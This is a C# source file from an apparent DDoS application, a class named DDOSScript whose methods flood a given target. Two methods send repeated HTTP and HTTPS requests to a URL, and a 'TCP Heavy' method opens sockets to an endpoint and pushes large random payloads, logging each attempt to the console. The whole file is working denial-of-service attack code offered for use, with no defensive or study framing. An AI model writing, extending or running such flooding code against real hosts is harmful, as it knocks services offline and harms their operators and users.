using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Net.Http;

namespace DDosApp.DDoS_Scripts
{
    internal static class DDOSScript
    { 
        public static int counter = 0;
        public static string OldStr = null;
        public static Random seed = new Random();

        // Http Download
        public static async Task ProtocolHTTPDownload(string ip)
        {
            await Task.Factory.StartNew(() =>
            {
                try
                {
                    HttpClient httpClient = new HttpClient();

                    httpClient.GetStringAsync(ip).Wait(1000);
                    httpClient.GetStreamAsync(ip).Wait(1000);
                    httpClient.Dispose();
                    WebClient client = new WebClient();
                    client.DownloadStringAsync(new Uri(ip));
                    counter++;
                }
                catch
                {
                    counter++;

                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[ERROR {DateTime.Now}] The task is dropped {counter}.");

                    return;
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[INFO {DateTime.Now}] Task HTTP Download finised {counter}.");
            });
        }
        
        // Https Download
        public static async Task ProtocolHTTPSDownload(string ip)
        {
            await Task.Factory.StartNew(() =>
            {
                try
                {
                    WebClient client = new WebClient();
                    client.DownloadStringAsync(new Uri(ip));
                    counter++;
                }
                catch
                {
                    counter++;

                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[ERROR {DateTime.Now}] The task is dropped {counter}.");

                    return;
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[INFO {DateTime.Now}] Task HTTPS Download finised {counter}.");
            });
        }
        
        // TCP Heavy
        public static async Task ProtocolTCPHeavy(IPAddress ip, IPEndPoint port)
        {
            await Task.Factory.StartNew(() =>
            {
                int timeout = seed.Next(1000, 10000);
                Socket sender = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                try
                {
                    sender.ConnectAsync(port).Wait(timeout);
                    sender.Send(Encoding.ASCII.GetBytes(RandomString(3000, ref OldStr)));
                    sender.Close();
                    counter++;
                }
                catch (Exception)
                {
                    counter++;

                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[ERROR {DateTime.Now}] The task is dropped {counter}.");

                    return;
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[INFO {DateTime.Now}] Task TCP Heavy finised {counter}.");
            });
        }

        private static string RandomString(int length, ref string old_string)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return old_string + new string(Enumerable.Repeat(chars, length)
                .Select(s => s[seed.Next(s.Length)]).ToArray());;
        }
    }
}
